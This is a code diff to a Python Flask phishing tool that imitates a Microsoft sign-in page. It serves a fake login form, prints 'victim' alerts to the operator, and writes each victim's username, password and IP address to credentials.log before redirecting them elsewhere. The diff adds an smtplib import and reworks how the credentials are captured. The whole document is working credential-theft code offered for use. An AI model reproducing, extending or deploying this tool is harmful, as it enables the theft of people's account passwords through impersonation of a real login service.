@@ -2,9 +2,10 @@ from flask import Flask, request, render_template, send_file, redirect
 from threading import Thread
 from colorama import Fore
 from sys import argv
-import sys
 import colorama
 import logging
+import smtplib
+import sys
 import os
 
 #### Variables
@@ -31,10 +32,9 @@ elif display_reqs != "y":
 print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Waiting for victim to go to the link...", end="\r")
 #### App.route
 @app.route("/")
-def index():
-    ip_addr = Fore.CYAN + request.headers.get('X-Forwarded-For') if request.headers.get('X-Forwarded-For') is not None else Fore.CYAN + request.remote_addr
+def email():
     print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Victim has gone to the phishing page!" + " " * 40)
-    print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " IP address found:", ip_addr)
+    print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " IP address found:", Fore.CYAN + request.headers.get('X-Forwarded-For') if request.headers.get('X-Forwarded-For') is not None else Fore.CYAN + request.remote_addr)
     print("\n\n" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Waiting for victim to enter credentials...", end="\r")
     return render_template("email.html")
 
@@ -49,14 +49,12 @@ def passwd():
 
 @app.route("/login.php", methods=["POST"])
 def getcreds():
-    ip_addr = request.headers.get('X-Forwarded-For') if request.headers.get('X-Forwarded-For') is not None else request.remote_addr
     with open("credentials.log" , "a") as file:
         print("\033[3A" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Victim entered credentials!"+ " " * 43)
-        print("\033[1B" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Password: " + Fore.CYAN + f"{request.form.to_dict(flat=False)[list(request.form.to_dict(flat=False).keys())[0]][0]}" + " "*31)
+        print("\033[1B" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Password: " + Fore.CYAN + f"{request.form.get('passwd')}" + " "*31)
         print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Saved in: " + Fore.CYAN + "credentials.log")
-        file.write(f"{list(request.form.to_dict(flat=False).keys())[0]} : {request.form.to_dict(flat=False)[list(request.form.to_dict(flat=False).keys())[0]][0]} : {ip_addr} : {sitename}\n")
+        file.write(f"{request.form.to_dict(flat=False)['loginfmt'][0]} : {request.form.get('passwd')} : {request.headers.get('X-Forwarded-For') if request.headers.get('X-Forwarded-For') is not None else request.remote_addr} : {sitename}\n")
         return redirect(redirect_url)
-
 
 
 @app.route("/sprites/microsoft_logo.svg")
@@ -74,9 +72,9 @@ def JS_1():
     return send_file(os.path.join("templates", "index", "ConvergedLoginPaginatedStrings.EN.js"))
 
 
-@app.route("/index/Converged_v21033.css")
+@app.route("/index/login.css")
 def CSS():
-    return send_file(os.path.join("templates", "index", "Converged_v21033.css"))
+    return send_file(os.path.join("templates", "index", "login.css"))
 
 
 @app.route("/index/ConvergedLogin_PCore.js")
